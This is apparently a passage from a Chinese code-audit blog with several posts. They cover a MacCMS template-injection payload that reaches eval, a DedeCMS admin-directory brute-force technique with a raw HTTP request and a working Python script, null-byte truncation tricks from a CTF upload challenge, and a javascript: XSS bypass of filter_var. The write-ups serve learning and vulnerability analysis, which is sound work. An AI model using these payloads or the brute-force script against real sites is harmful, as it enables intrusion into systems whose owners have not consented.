              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<pre><code>payload: /index.php?m=vod-search&amp;wd={if-Z9:phpinfo()}{endif-Z9}
</code></pre><p>###<strong>漏洞简要:</strong><br>wd 参数未经严格过滤导致可以插入程序自写的if标签 经解析导致命令执行</p>
<p>###<strong>代码分析:</strong><br>首先从<strong>index.php</strong>开始分析<br>开头包含了<code>inc/conn.php</code>而<code>conn.php</code>又包含了<code>inc/common/template.php</code> 这个文件是完成漏洞利用的文件 并且这个文件新建了一个类对象:</p>
<pre><code>#inc/common/template.php
class AppTpl
{
    var $markname,$markpar,$markdes,$markval,$markhtml;
    function AppTpl()
    {
......
</code></pre><p>$tpl = new AppTpl();</p>
<p>接着在第15行:<code>$m = be(&#39;get&#39;,&#39;m&#39;);</code> 跟进<code>be()</code>函数,在<code>inc\common\function.php</code>查看功能,主要是对用户输入的数据进行消毒,防止SQL注入<br>接着分析<strong>index.php</strong></p>
<pre><code>   #index.php
   ......
    $m = be(&apos;get&apos;,&apos;m&apos;);
if(strpos($m,&apos;.&apos;)){ $m = substr($m,0,strpos($m,&apos;.&apos;)); } 
$par = explode(&apos;-&apos;,$m);
$parlen = count($par);
$ac = $par[0];
......
$acs = array(&apos;vod&apos;,&apos;art&apos;,&apos;map&apos;,&apos;user&apos;,&apos;gbook&apos;,&apos;comment&apos;,&apos;label&apos;);
    if(in_array($ac,$acs)){
        $tpl-&gt;P[&quot;module&quot;] = $ac;
        include MAC_ROOT.&apos;/inc/module/&apos;.$ac.&apos;.php&apos;;
      }

?&gt;
</code></pre><p>根据payload,我们可得到 <code>\$ac=vod $method=search</code> 第38行包含<code>inc\common\vod.php</code>,我们查看<code>vod.php</code>找到<code>search()</code>方法</p>
<pre><code># /inc/module/vod.php
......
elseif($method==&apos;search&apos;)
{
    $tpl-&gt;P[&quot;siteaid&quot;] = 15;
    $wd = be(&quot;all&quot;, &quot;wd&quot;);//对传入的wd参数进行消毒
    if(!empty($wd)){ $tpl-&gt;P[&quot;wd&quot;] = $wd; }
......
    $tpl-&gt;H = loadFile(MAC_ROOT_TEMPLATE.&quot;/vod_search.html&quot;);
    //加载模板文件
    $tpl-&gt;mark();
    $tpl-&gt;pageshow();
    $colarr = array(&apos;{page:des}&apos;,&apos;{page:key}&apos;,&apos;{page:now}&apos;,&apos;{page:order}&apos;,&apos;{page:by}&apos;,&apos;{page:wd}&apos;,&apos;{page:wdencode}&apos;,&apos;{page:pinyin}&apos;,&apos;{page:letter}&apos;,&apos;{page:year}&apos;,&apos;{page:starring}&apos;,&apos;{page:starringencode}&apos;,&apos;{page:directed}&apos;,&apos;{page:directedencode}&apos;,&apos;{page:area}&apos;,&apos;{page:areaencode}&apos;,&apos;{page:lang}&apos;,&apos;{page:langencode}&apos;,&apos;{page:typeid}&apos;,&apos;{page:typepid}&apos;,&apos;{page:classid}&apos;);
    $valarr = array($tpl-&gt;P[&quot;des&quot;],$tpl-&gt;P[&quot;key&quot;],$tpl-&gt;P[&quot;pg&quot;],$tpl-&gt;P[&quot;order&quot;],$tpl-&gt;P[&quot;by&quot;],$tpl-&gt;P[&quot;wd&quot;],urlencode($tpl-&gt;P[&quot;wd&quot;]),$tpl-&gt;P[&quot;pinyin&quot;],$tpl-&gt;P[&quot;letter&quot;],$tpl-&gt;P[&apos;year&apos;]==0?&apos;&apos;:$tpl-&gt;P[&apos;year&apos;],$tpl-&gt;P[&quot;starring&quot;],urlencode($tpl-&gt;P[&quot;starring&quot;]),$tpl-&gt;P[&quot;directed&quot;],urlencode($tpl-&gt;P[&quot;directed&quot;]),$tpl-&gt;P[&quot;area&quot;],urlencode($tpl-&gt;P[&quot;area&quot;]),$tpl-&gt;P[&quot;lang&quot;],urlencode($tpl-&gt;P[&quot;lang&quot;]),$tpl-&gt;P[&apos;typeid&apos;],$tpl-&gt;P[&apos;typepid&apos;] ,$tpl-&gt;P[&apos;classid&apos;]  );
    $tpl-&gt;H = str_replace($colarr, $valarr ,$tpl-&gt;H);
    //直接写入模板文件
</code></pre><p>这里把我们传入的<code>wd={if-Z9:phpinfo()}{endif-Z9}</code> 赋值给 <code>\$tpl-&gt;P[&quot;wd&quot;]</code> 且这里<code>$tpl-&gt;H = str_replace($colarr, $valarr ,$tpl-&gt;H);</code>对<code>$tpl-&gt;H</code>即vod_search.html做了内容替换,将所有形如:<code>{page:wd}</code>都被替换为<code>{if-A:phpinfo()}{endif-A}</code></p>
<p>接着分析index.php</p>
<pre><code>#index.php
......
    $tpl-&gt;ifex();
    if(!empty($tpl-&gt;P[&apos;cp&apos;])){ setPageCache($tpl-&gt;P[&apos;cp&apos;],$tpl-&gt;P[&apos;cn&apos;],$tpl-&gt;H); }
    $tpl-&gt;run();
    echo $tpl-&gt;H;
</code></pre><p>在这里调用了<code>ifex()</code>函数 我们跟进<code>template.php</code>查看:</p>
<pre><code>#/inc/common/template.php
......
function ifex()
{
    if (!strpos(&quot;,&quot;.$this-&gt;H,&quot;{if-&quot;)) { return; }
    $labelRule = buildregx(&apos;{if-([\s\S]*?):([\s\S]+?)}([\s\S]*?){endif-\1}&apos;,&quot;is&quot;);
    //定义了正则规则
    preg_match_all($labelRule,$this-&gt;H,$iar);
    //匹配出正则提取出来的参数,得到一个二维数组$iar
    $arlen=count($iar[2]);

    for($m=0;$m&lt;$arlen;$m++){//进入循环
        $strn = $iar[1][$m];    //Z9
    $strif= asp2phpif( $iar[2][$m] ) ; //phpinfo
        $strThen= $iar[3][$m];   // 空的
......
</code></pre><p>审计到这里<code>$strif</code>成功的接收了我们插入的php代码(phpinfo) 接着我们要实现eval 接着分析<code>template.php</code></p>
<p>不满足878行的if条件:</p>
<pre><code>if (strpos(&quot;,&quot;.$strThen,$labelRule2)&gt;0){
</code></pre><p>不满足905行的if条件:</p>
<pre><code>if (strpos(&quot;,&quot;.$strThen,$labelRule3)&gt;0){
</code></pre><p>最后进入了没限制的913行的eval函数:</p>
<pre><code>@eval(&quot;if($strif){\$ifFlag=true;}else{\$ifFlag=false;}&quot;);
</code></pre><p>造成命令执行。</p>
<p><strong>漏洞利用:</strong><br><img src="http://static.zybuluo.com/chhyx/nrau74v1g0pby1ejqbc0iz4s/image_1cn8v87tn1p5r1mcjd45ao25aep.png" alt="image_1cn8v87tn1p5r1mcjd45ao25aep.png-58.1kB"></p>
<p><strong>源码下载</strong>:<a href="http://www.maccms.com/down.html1cn8v87tn1p5r1mcjd45ao25aep.png" target="_blank" rel="noopener">Maccms</a></p>
<p>参考文章:<br><a href="http://www.cnblogs.com/test404/p/7397755.html" target="_blank" rel="noopener">http://www.cnblogs.com/test404/p/7397755.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/12/DEDECMS历史难题--找后台目录/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/12/DEDECMS历史难题--找后台目录/" itemprop="url">DEDECMS历史难题--找后台目录</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-12T08:15:41+08:00">
                2018-09-12
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>看到先知社区有大佬发了文章<a href="https://xz.aliyun.com/t/2064" target="_blank" rel="noopener">解决DEDECMS历史难题–找后台目录</a>,看完觉得思路不错,决定自己分析总结一波</p>
</blockquote>
<hr>
<p>作者利用了Windows FindFirstFile函数+dedecms对图片的逻辑判断,成功爆出后台目录<br>在法师seay的《代码审计–企业级Web代码安全架构》中也有提及:</p>
<blockquote>
<p>目前大多数程序都会对上传的文件名加入时间戳等字符再进行MD5，然后下载文件的时候通过保存在数据库里的文件ID 读取出文件路径，一样也实现了文件下载，这样我们就无法直接得到我们上传的webshell 文件路径，但是当在Windows 下时，我们只需要知道文件所在目录，然后利用Windows 的特性就可以访问到文件，这是因为Windows 在搜索文件的时候使用到了FindFirstFile 这一个winapi 函数，该函数到一个文件夹(包括子文件夹) 去搜索指定文件。<br>利用方法很简单，我们只要将文件名不可知部分之后的字符用“&lt;”或者“&gt;”代替即可，不过要注意的一点是，只使用一个“&lt;”或者“&gt;”则只能代表一个字符，如果文件名是12345或者更长，这时候请求“1&lt;”或者“1&gt;”都是访问不到文件的，需要“1&lt;&lt;”才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。</p>
</blockquote>
<p>关于网上有人表哥说&lt;也可以读到文件名很长的文件,而法师说的&lt;只能代表一个字符,我们测试一波：</p>
<p>###<strong>本地测试:</strong></p>
<p>首先准备2个文件:</p>
<pre><code>202cb962ac59075b964b07152d234b70.txt
202cb962ac59075b964b07152d234b70.php
</code></pre><p>1.参数需要带文件后缀:</p>
<pre><code>payload:file=2&lt;
</code></pre><p><img src="http://static.zybuluo.com/chhyx/t3aop65at2iw48vpwlx1yo9m/image_1cn5ruv7sa6v1f2lv1hfacg6j1m.png" alt="image_1cn5ruv7sa6v1f2lv1hfacg6j1m.png-38.9kB"></p>
<pre><code>payload:file=2&lt;&lt;
</code></pre><p><img src="http://static.zybuluo.com/chhyx/jp3khkgebyq124uwgb8eru0n/image_1cn5rvev21hsp1tflakt109013f623.png" alt="image_1cn5rvev21hsp1tflakt109013f623.png-34.1kB"></p>
<p>2.参数不需要带文件后缀:</p>
<pre><code>payload:file=2&lt;
</code></pre><p><img src="http://static.zybuluo.com/chhyx/vt6vgwse7foft1cqoxrvu6jt/image_1cn5s0ur51kf42ml7q5k511cu72g.png" alt="image_1cn5rvev21hsp1tflakt109013f623.png-34.1kB"></p>
<p>第一种情况显然表明&lt;只能代表一个字符,但是第二种情况又表明一个&lt;也可以读到很长的文件,说明&lt;能否读到很长的文件还要考虑代码这一因素</p>
<p>3.在<a href="http://www.dedecms.com/products/dedecms/downloads/" target="_blank" rel="noopener">dedecms5.6</a>环境下测试:<br>payload:</p>
<pre><code>POST /tags.php HTTP/1.1
Host: 127.0.0.1:82
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 121

_FILES[p0rZ9][tmp_name]=./p0&lt;&lt;/img/adminico.gif&amp;_FILES[p0rZ9][name]=0&amp;_FILES[p0rZ9][size]=0&amp;_FILES[p0rZ9][type]=image/gif
</code></pre><p><img src="http://static.zybuluo.com/chhyx/g61oaggd05oj4xxxxe3284gb/image_1cn6631mcdvs2n5muc10okai79.png" alt="image_1cn6631mcdvs2n5muc10okai79.png-86.7kB"><br><img src="http://static.zybuluo.com/chhyx/tknt5ez48xwje4i3ob2txidt/image_1cn667lrih84hn44v17ndommm.png" alt="image_1cn667lrih84hn44v17ndommm.png-60.3kB"></p>
<p>可以看到存在与不存在返回的内容是不同的,我们可以根据这个来爆破后台目录<br>但是在测试过程中中我发现在如果含有了相同前缀目录 会对我们的测试造成不可预知的错误<br>具体看操作:</p>
<p><img src="http://static.zybuluo.com/chhyx/2ae5cqoa7ri8zz6zsuja82xd/image_1cn66uapbpgku4h1lmg157pl0n16.png" alt="image_1cn66uapbpgku4h1lmg157pl0n16.png-105kB"></p>
<p><img src="http://static.zybuluo.com/chhyx/9y729960vrzixdazmmb4ii9e/image_1cn66psf16fu1d0i16af1sf965pp.png" alt="image_1cn66psf16fu1d0i16af1sf965pp.png-98.8kB"></p>
<p><img src="http://static.zybuluo.com/chhyx/nw14m24pk94i2f0216pv1j4q/ff4dcaa5-a422-4b9f-a071-a1a5bf1c89f4.png" alt="ff4dcaa5-a422-4b9f-a071-a1a5bf1c89f4.png-86.6kB"></p>
<p>思考了一下这里是因为FindFirstFile函数会找第一个字母正确的文件,然后再去对比<br>所以在这里我们需要把p[a-z,0-9]这样去Fuzz把第一位字符为p的情况都跑一下,得到正确的前缀,与开头字母相同的目录区分开,然后再去爆破后面的<br>根据这个思路,我们就可以用py写一个简单的爆破脚本:</p>
<pre><code>#!/usr/bin/python
# -*- coding: UTF-8 -*-
#author: P0rZ9
#env: python2

import requests
import itertools

url = &apos;http://127.0.0.1:82/tags.php&apos;
flag = 0
string = &apos;abcdefghijklmnopqrstuvwxyz0123456789_!#;.&apos;
result_dir = &apos;&apos;
payload = &apos;./{}&lt;&lt;/img/adminico.gif&apos;
data = {
    &apos;_FILES[p0rZ9][tmp_name]&apos; : payload,
    &apos;_FILES[p0rZ9][name]&apos; : 0,
    &apos;_FILES[p0rZ9][size]&apos; : 0,
    &apos;_FILES[p0rZ9][type]&apos; : &apos;image/gif&apos;
}

#得到前缀 与开头字母相同的目录区分开来
for num in range(1,7):
    if flag:
        break
    for char in itertools.permutations(string,num):#创建迭代器
        char = &apos;&apos;.join(list(char))
        data[&apos;_FILES[p0rZ9][tmp_name]&apos;] = data[&apos;_FILES[p0rZ9][tmp_name]&apos;].format(char)
        re = requests.post(url,data=data)
        if &apos;Upload filetype not allow !&apos; not in re.text and re.status_code == 200:
            flag = 1
            result_dir = char   
            data[&apos;_FILES[p0rZ9][tmp_name]&apos;] = payload
            break
        else:
            data[&apos;_FILES[p0rZ9][tmp_name]&apos;] = payload
print &apos;[+]---test---&apos; + result_dir

flag = 0

#爆破目录
for i in range(50):
    if flag:
        break
    for char in string:
        if char == string[-1]:
            flag = 1
            break
        data[&apos;_FILES[p0rZ9][tmp_name]&apos;] = data[&apos;_FILES[p0rZ9][tmp_name]&apos;].format(result_dir+char)
        #print result_dir+char
        re = requests.post(url, data=data)
        if &quot;Upload filetype not allow !&quot; not in re.text and re.status_code == 200:
            result_dir += char
            print &apos;[+]---test---&apos; + result_dir
            data[&apos;_FILES[p0rZ9][tmp_name]&apos;] = payload
            break
        else:
            data[&apos;_FILES[p0rZ9][tmp_name]&apos;] = payload

print &apos;[+]---result---&apos; + result_dir
</code></pre><p>演示结果:<br><img src="http://static.zybuluo.com/chhyx/fnkdqbqsk1vcsjthfzetp6de/17af9eea-fc2c-422d-ab34-7abd43bbadca.png" alt="17af9eea-fc2c-422d-ab34-7abd43bbadca.png-73.3kB"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/08/00截断的那些事儿/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/08/00截断的那些事儿/" itemprop="url">00截断的那些事儿</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-08T01:51:41+08:00">
                2018-09-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>今天在看法师的《代码审计》的文件操作时,多次提到00截断,自己不是很明白原理,所以查了查资料总结分享一波。</p>
</blockquote>
<hr>
<p>##<strong>0x00截断</strong><br>0x00是ascii码值为0的字符(也就是null),有些函数处理时 会把这个当作结束符而起到截断的作用,而这个ascii码为零的位置在16进制中是00，用0x开头表示16进制，也就是所说的0x00截断。</p>
<p>实验吧的一道题目:<br><a href="http://ctf5.shiyanbar.com/web/upload/" target="_blank" rel="noopener">web-文件上传</a><br>经测试,题目是把dir的值与filename拼接来得到文件具体路径,而且题目要求我们上传后缀为php的文件,我们利用0x00具体操作:<br><img src="http://static.zybuluo.com/chhyx/vkncrlg1mqbt76aihgo06lcn/image_1cmqegtqjq1j1qoa7b4ed15ti5n.png" alt="image_1cmqegtqjq1j1qoa7b4ed15ti5n.png-29.4kB"><br><img src="http://static.zybuluo.com/chhyx/bosc6ugmftvb5kuymo1iyt2w/image_1cmqei3ro107jblq4r6hlffk864.png" alt="image_1cmqei3ro107jblq4r6hlffk864.png-66.4kB"><br>将25改为00即可截断成功<br>原理就是利用ascii码为零这个特殊字符,让系统认为字符串已经结束</p>
<p>##<strong>%00截断</strong><br>我们本地建文件测试:<br><img src="http://static.zybuluo.com/chhyx/f5grc6w6qw7xkssvsik3ow8u/image_1cmqais5n160uoj1bg31nkfcdv9.png" alt="image_1cmqais5n160uoj1bg31nkfcdv9.png-33.1kB"><br>分析要求可知:经get传入a的值 经ereg验证 必须是数字 但是经过strpos匹配又必须含有#biubiu 那这里也需要0x00截断 直接看操作:<br><img src="http://static.zybuluo.com/chhyx/9oix7wim5mao59ouby687w5p/image_1cmqarhckic71dbm15qrork17br1p.png" alt="image_1cmqarhckic71dbm15qrork17br1p.png-35.9kB"><br>这里还需要知道的是 #属于url特殊字符的一种 </p>
<blockquote>
<p><strong>url的特殊字符:</strong><br>1、空格换成加号(+)<br>2、正斜杠(/)分隔目录和子目录<br>3、问号(?)分隔URL和查询<br>4、百分号(%)制定特殊字符<br>5、#号指定书签<br>6、&amp;号分隔参数</p>
</blockquote>
<p>如果需要在URL中用到这些字符,需要将其换成相应的十六进制的值</p>
<blockquote>
<p>+ —- %2B<br>  / —-  %2F<br>  ?  —-     %3F<br>  % —-      %25<br> # —-     %23<br>  &amp; —-      %26</p>
</blockquote>
<p>我们改下payload:</p>
<pre><code>demo.php?a=1%00%23biubiu
</code></pre><p><img src="http://static.zybuluo.com/chhyx/gzbnhiooiwq4njw0pythtchy/image_1cmqb761uggj1k2hb912jd13t626.png" alt="image_1cmqb761uggj1k2hb912jd13t626.png-35.4kB"></p>
<p>成功执行<br>我们知道url发送到服务器后就被服务器解码,这时候并未传送到验证函数 就是说验证函数接收到的是%00解码后的内容,我们来看一下<br><img src="http://static.zybuluo.com/chhyx/9h146khh9wsjhvphbeanyqn4/image_1cmqbfj6hakc1e5k1prp19s1prm2j.png" alt="image_1cmqbfj6hakc1e5k1prp19s1prm2j.png-24kB"><br>我们猜测上图左面的小方块是解码后的0x00 我们来验证一下</p>
<p>没效果(%00未解码前):<br><img src="http://static.zybuluo.com/chhyx/pxzk57b121dy69equr06lzff/image_1cmqbt7387561hiq1nkcp97nfr3g.png" alt="image_1cmqbt7387561hiq1nkcp97nfr3g.png-34.9kB"></p>
<p>成功的(%00解码后):<br><img src="http://static.zybuluo.com/chhyx/derjryeijdajnojj3gzrvsjk/image_1cmqc6bco4hkldhf8g1d3i31m4t.png" alt="image_1cmqc6bco4hkldhf8g1d3i31m4t.png-57kB"><br>我们用<a href="https://mh-nexus.de/en/downloads.php?product=HxD" target="_blank" rel="noopener">HxD</a>将此处的25(%)变为00<br><img src="http://static.zybuluo.com/chhyx/eso9q6ojl663gb7svdne2i40/image_1cmqccn561t1b1gb5g7v8pl1c575a.png" alt="image_1cmqccn561t1b1gb5g7v8pl1c575a.png-9kB"><br>成功绕过 说明%00是被服务器解码为0x00发挥了截断作用</p>
<p>所以,%00又被称为url的终止符。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/06/代码审计之Day2 - filter_var函数缺陷/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/06/代码审计之Day2 - filter_var函数缺陷/" itemprop="url">代码审计之Day2 - filter_var函数缺陷</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-06T10:15:41+08:00">
                2018-09-06
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>最近看红日公众号的文章,看到 <strong>PHP-Audit-Labs</strong> 这个项目 ,正好最近开始学PHP,所以跟着大佬脚步学习一波</p>
</blockquote>
<hr>
<p><strong>Day 2 - Twig</strong><br>题目名字:Twig<br><img src="http://static.zybuluo.com/chhyx/36d1fhnqk45hoxmjz55p0rya/image_1cmn8bi0j13r79fvd85to7p05p.png" alt="image_1cmn8bi0j13r79fvd85to7p05p.png-211.8kB"></p>
<p><strong>代码大意</strong>:php脚本接收GET传输过来的\$nextSlide参数,然后经过\filter_var()函数过滤处理之后赋值给\$link,然后$link这个参数经过escape过滤器处理 最后渲染index.html</p>
<p><strong>漏洞产生</strong>:这里考察的是xss漏洞,导致这一漏洞产生的原因是题中代码使用的escape过滤器跟filter_car()函数两个过滤方法并不安全,导致攻击者可构造js语句 造成xss(跨站脚本攻击)漏洞</p>
<p><strong>漏洞解析</strong>: escape过滤器(本质是htmlspecialchars函数)与filter_var()过滤函数的缺陷:并不能捕捉到jacascript伪协议构造的xss语句</p>
<p>题目中使用了<a href="https://twig.symfony.com/" target="_blank" rel="noopener">Twig</a>定义的escape过滤器跟filter_car()函数两个过滤方法，下面我们先讲一下这两种过滤的规则是怎样的</p>
<p>1.<a href="https://twig.symfony.com/doc/2.x/filters/escape.html" target="_blank" rel="noopener"><strong>escape</strong></a><br>在默认情况下 escape使用html转义策略</p>
<blockquote>
<p>在内部，escape使用PHP本机htmlspecialchars函数进行HTML转义策略。</p>
</blockquote>
<p>我们接着看下<strong>htmlspecialchars()</strong>函数</p>
<blockquote>
<p><a href="http://php.net/manual/zh/function.htmlspecialchars.php" target="_blank" rel="noopener">htmlspecialchars()</a><br>(PHP 4, PHP 5, PHP 7)<br><strong>作用:</strong> 将特殊字符转换为 HTML 实体<br><strong>定义:</strong> string htmlspecialchars ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string $encoding = ini_get(“default_charset”) [, bool $double_encode = TRUE ]]] )</p>
</blockquote>
<p>转义前后字符:<br><img src="http://static.zybuluo.com/chhyx/7gmkdgry3l238wu19n9jti2s/image_1cmndbk64bioafv1kih1lm8uhq16.png" alt="image_1cmndbk64bioafv1kih1lm8uhq16.png-8.5kB"></p>
<p>2.<a href="http://php.net/manual/zh/function.filter-var.php" target="_blank" rel="noopener"><strong>filter_var()</strong></a><br>这里使用<strong>filter_var</strong>函数来过滤<strong>\$nextSlide</strong>变量 且用了<a href="http://php.net/manual/zh/function.filter-var.php" target="_blank" rel="noopener"><strong>FILTER_VALIDATE_URL</strong></a>过滤器来判断是否一个合法的url。</p>
<blockquote>
<p><a href="http://php.net/manual/zh/function.filter-var.php" target="_blank" rel="noopener"><strong>filter_var()</strong></a><br>(PHP 5 &gt;= 5.2.0, PHP 7)<br><strong>作用:</strong> 使用特定的过滤器过滤一个变量</p>
<p><strong>定义:</strong> mixed filter_var ( mixed \$variable [, int \$filter = FILTER_DEFAULT [, mixed \$options ]] )</p>
</blockquote>
<p>针对这两处的过滤,我们可以使用javascript://伪协议来绕过:</p>
<pre><code>javascript://P0rZ9%250aalert(1);
</code></pre><p>我们来本地测试一下：<br><img src="http://static.zybuluo.com/chhyx/7rjo70x4enrxtfm0su3w0fbh/image_1cmnjdbvppef19no1akip5acj7m.png" alt="image_1cmnjdbvppef19no1akip5acj7m.png-27.6kB"><br><img src="http://static.zybuluo.com/chhyx/6tmfahno1m39g0k806q0wtlj/image_1cmnkgim5qjv1hh0hbqr7e1tb013.png" alt="image_1cmnkgim5qjv1hh0hbqr7e1tb013.png-63.6kB"></p>
<p>成功执行alert(1)<br>代码实际意思:</p>
<pre><code>//         表示单行注释 注释掉后面的P0rZ9
%250a      %0a(换行符)经过url编码
alert(1);  执行的js代码
</code></pre><p><img src="http://static.zybuluo.com/chhyx/cxbyhnaq15qc2li0wa8rl95i/image_1cmnku1271fjr1bii1jggoa2lbr4t.png" alt="image_1cmnku1271fjr1bii1jggoa2lbr4t.png-8.2kB"></p>
<p>所以php脚本程序在接到浏览器传输过来的<strong>payload:</strong> <code>javascript://P0rZ9%250aalert(1);</code> 会先解码成 <code>javascript://P0rZ9%0aalert(1);</code> 然后赋值给\$url,我们点击a标签的链接就会触发alert()函数。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">P0rZ9</p>
              <p class="site-description motion-element" itemprop="description">找回当年那个被寄予厚望的自己</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">42</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">9</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">P0rZ9</span>

  
</div>












        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

